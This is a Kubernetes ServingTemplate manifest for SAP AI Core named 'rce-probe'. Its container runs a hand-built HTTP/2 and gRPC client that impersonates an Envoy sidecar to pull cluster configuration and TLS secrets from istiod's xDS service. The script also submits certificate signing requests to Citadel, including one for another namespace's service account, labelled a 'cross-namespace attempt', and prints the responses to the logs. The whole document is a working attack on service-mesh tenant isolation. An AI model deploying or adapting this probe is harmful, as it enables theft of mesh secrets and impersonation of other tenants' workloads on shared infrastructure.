apiVersion: ai.sap.com/v1alpha1
kind: ServingTemplate
metadata:
  name: rce-probe
  labels:
    scenarios.ai.sap.com/id: "rce-probe"
    ai.sap.com/version: "4.8.0"
  annotations:
    scenarios.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/description: "istiod-xds-post-fix-citadel-csr-signing"
    executables.ai.sap.com/name: "rce-probe"
spec:
  template:
    apiVersion: "serving.kserve.io/v1beta1"
    metadata:
      annotations: |
        autoscaling.knative.dev/target: 1
      labels: |
        ai.sap.com/resourcePlan: starter
    spec: |
      predictor:
        minReplicas: 1
        maxReplicas: 1
        containers:
        - name: kserve-container
          image: python:3.11
          command: ["/bin/sh", "-c"]
          args:
          - |
            python3 -c "
            import socket, struct, select as sel

            print('[PROBE_V48_START]', flush=True)

            # ── H2 helpers ────────────────────────────────────────────────────────
            def encode_varint(n):
                out = b''
                while True:
                    bits = n & 0x7F; n >>= 7
                    out += bytes([bits | (0x80 if n else 0)])
                    if not n: break
                return out

            def encode_string_field(n, s):
                b = s.encode()
                return bytes([n << 3 | 2]) + encode_varint(len(b)) + b

            def encode_msg_field(n, msg):
                return bytes([n << 3 | 2]) + encode_varint(len(msg)) + msg

            def grpc_frame(msg):
                return b'\x00' + struct.pack('>I', len(msg)) + msg

            def h2_frame(ftype, flags, stream_id, payload):
                l = len(payload)
                return struct.pack('>I', l)[1:] + bytes([ftype, flags]) + struct.pack('>I', stream_id) + payload

            def h2_settings_ack():
                return h2_frame(0x04, 0x01, 0, b'')

            def h2_win_update(stream, incr):
                return h2_frame(0x08, 0x00, stream, struct.pack('>I', incr))

            def read_h2_frames(sock, n=15, timeout=8):
                frames = []
                for _ in range(n):
                    r, _, _ = sel.select([sock], [], [], timeout)
                    if not r: break
                    hdr = b''
                    while len(hdr) < 9:
                        c = sock.recv(9-len(hdr))
                        if not c: return frames
                        hdr += c
                    length = struct.unpack('>I', b'\x00'+hdr[:3])[0]
                    ftype = hdr[3]; flags = hdr[4]
                    stream = struct.unpack('>I', hdr[5:9])[0] & 0x7FFFFFFF
                    data = b''
                    while len(data) < length:
                        c = sock.recv(length-len(data))
                        if not c: break
                        data += c
                    frames.append((ftype, flags, stream, data))
                    if ftype == 0x04 and not (flags & 0x01):
                        sock.sendall(h2_settings_ack())
                    if ftype == 0x00:
                        sock.sendall(h2_win_update(0, max(1, len(data))))
                return frames

            def hpack_lit(name, value, huffman=False):
                # Literal without indexing (0x00 prefix)
                n = name.encode(); v = value.encode()
                return bytes([0x00]) + encode_varint(len(n)) + n + encode_varint(len(v)) + v

            def grpc_connect(host, port, path, grpc_msg, stream_id=1, timeout=12):
                s = socket.socket(); s.settimeout(timeout)
                s.connect((host, port))
                CLIENT_PREFACE = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
                s.sendall(CLIENT_PREFACE + h2_frame(0x04, 0x00, 0, b''))
                frames = read_h2_frames(s, n=3, timeout=5)

                # HEADERS: POST, content-type: application/grpc
                hblock = (
                    bytes([0x83]) +          # :method POST (static idx 3)
                    hpack_lit(':path', path) +
                    bytes([0x86]) +          # :scheme http (static idx 6)
                    hpack_lit(':authority', f'{host}:{port}') +
                    hpack_lit('content-type', 'application/grpc') +
                    hpack_lit('te', 'trailers')
                )
                s.sendall(h2_frame(0x01, 0x04, stream_id, hblock))
                s.sendall(h2_frame(0x00, 0x01, stream_id, grpc_frame(grpc_msg)))

                resp_frames = read_h2_frames(s, n=20, timeout=timeout)
                s.close()
                return frames + resp_frames

            # ── XDS ADS DiscoveryRequest ──────────────────────────────────────────
            # Node identity that mimics a real Envoy proxy on this cluster
            NODE_ID = 'sidecar~100.64.0.2~probe.rg-0d70dc91-cd927cab~rg-0d70dc91-cd927cab.svc.cluster.local'
            CLUSTER = 'rg-0d70dc91-cd927cab'
            node_pb = encode_string_field(1, NODE_ID) + encode_string_field(3, CLUSTER)

            for type_url in [
                'type.googleapis.com/envoy.config.cluster.v3.Cluster',
                'type.googleapis.com/envoy.extensions.transport_sockets.tls.v3.Secret',
            ]:
                print(f'[XDS] type_url={type_url}', flush=True)
                dr = encode_msg_field(2, node_pb) + encode_string_field(4, type_url)
                try:
                    frames = grpc_connect(
                        'istiod.istio-system.svc.cluster.local', 15010,
                        '/envoy.service.discovery.v3.AggregatedDiscoveryService/StreamAggregatedResources',
                        dr, stream_id=1, timeout=12
                    )
                    for ftype, flags, stream, data in frames:
                        info = f'type={ftype} flags={flags:02x} stream={stream} len={len(data)}'
                        if ftype == 0x00 and data:  # DATA frame = gRPC response
                            # Strip 5-byte gRPC framing
                            grpc_data = data[5:] if len(data) > 5 else data
                            print(f'  DATA {info} grpc_hex={grpc_data[:100].hex()}', flush=True)
                            # Try to find any string resources
                            printable = ''.join(chr(b) if 32 <= b < 127 else '.' for b in grpc_data)
                            print(f'  DATA printable: {printable[:200]}', flush=True)
                        elif ftype == 0x01:  # HEADERS frame
                            printable = ''.join(chr(b) if 32 <= b < 127 else '.' for b in data)
                            print(f'  HEADERS {info}: {printable[:200]}', flush=True)
                        else:
                            print(f'  frame {info}', flush=True)
                except Exception as e:
                    print(f'  ERR: {e}', flush=True)

            # ── Citadel CSR — our own SPIFFE identity ─────────────────────────────
            OWN_CSR = '''-----BEGIN CERTIFICATE REQUEST-----
            MIIBKTCB0QIBADAYMRYwFAYDVQQKDA1jbHVzdGVyLmxvY2FsMFkwEwYHKoZIzj0C
            AQYIKoZIzj0DAQcDQgAEQ2+Sk3jcBmTI3G3vr88oCll/Dgv3LuTzsefuRAjdiXcI
            WL9dy3BLZSwFCRwKN5GugqiV/705co8MLrF9Aui0R6BXMFUGCSqGSIb3DQEJDjFI
            MEYwRAYDVR0RBD0wO4Y5c3BpZmZlOi8vY2x1c3Rlci5sb2NhbC9ucy9yZy0wZDcw
            ZGM5MS1jZDkyN2NhYi9zYS9kZWZhdWx0MAoGCCqGSM49BAMCA0cAMEQCIGmkDRt5
            KrwKI/eyqWgY7rjFfDwXXM+7py4K3UekLn7YAiAsbkD6rSZzWp/u1LZ5YwblNNT8
            23WLjPVrRiu2CaK04g==
            -----END CERTIFICATE REQUEST-----'''

            # Citadel CSR for the USER-MANAGEMENT SA identity (cross-namespace attempt)
            USRMGMT_CSR = '''-----BEGIN CERTIFICATE REQUEST-----
            MIIBKDCB0AIBADAYMRYwFAYDVQQKDA1jbHVzdGVyLmxvY2FsMFkwEwYHKoZIzj0C
            AQYIKoZIzj0DAQcDQgAEcdxDit3PIkFW0Qe4d5TF0QowfFrm8qfC+fwH9eqtpn+H
            9NPKakokPIL0hzRIcTlAEi8p/a5bptdKvPh4vymbaqBWMFQGCSqGSIb3DQEJDjFH
            MEUwQwYDVR0RBDwwOoY4c3BpZmZlOi8vY2x1c3Rlci5sb2NhbC9ucy91c2VyLW1h
            bmFnZW1lbnQvc2EvYXBpLXNlcnZpY2UwCgYIKoZIzj0EAwIDRwAwRAIgMitkHjN6
            Sph/GvJ/QYkS+AuCyBtDCmNN0ATYHNXCz3ICIFY4YY1hGFmXvpR5rIMMUn9VV8Rq
            i6rDkzEVdB1AGiIJ
            -----END CERTIFICATE REQUEST-----'''

            for label, csr_pem in [('OWN', OWN_CSR), ('USER-MGMT', USRMGMT_CSR)]:
                print(f'[CITADEL-CSR] {label}', flush=True)
                csr_clean = '\n'.join(l.strip() for l in csr_pem.strip().splitlines())
                # IstioCertificateRequest: field 1=csr, field 2=validity_duration(86400s)
                csr_pb = encode_string_field(1, csr_clean)
                csr_pb += bytes([0x10]) + encode_varint(86400)  # field 2, varint 86400
                try:
                    frames = grpc_connect(
                        'istiod.istio-system.svc.cluster.local', 15010,
                        '/istio.v1.auth.IstioCertificateService/CreateCertificate',
                        csr_pb, stream_id=3, timeout=12
                    )
                    for ftype, flags, stream, data in frames:
                        info = f'type={ftype} flags={flags:02x} stream={stream} len={len(data)}'
                        if ftype == 0x00 and data:
                            grpc_data = data[5:] if len(data)>5 else data
                            # If we got a cert, it starts with PEM header
                            printable = ''.join(chr(b) if 32<=b<127 else '.' for b in grpc_data)
                            print(f'  DATA {info}: {printable[:500]}', flush=True)
                        elif ftype == 0x01:
                            printable = ''.join(chr(b) if 32<=b<127 else '.' for b in data)
                            print(f'  HDRS {info}: {printable[:300]}', flush=True)
                except Exception as e:
                    print(f'  ERR: {e}', flush=True)

            print('[PROBE_V48_DONE]', flush=True)
            " 2>&1
            python3 -c "
            import http.server
            class H(http.server.BaseHTTPRequestHandler):
                def do_GET(self): self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
                def log_message(self, *a): pass
            http.server.HTTPServer(('', 8080), H).serve_forever()
            "
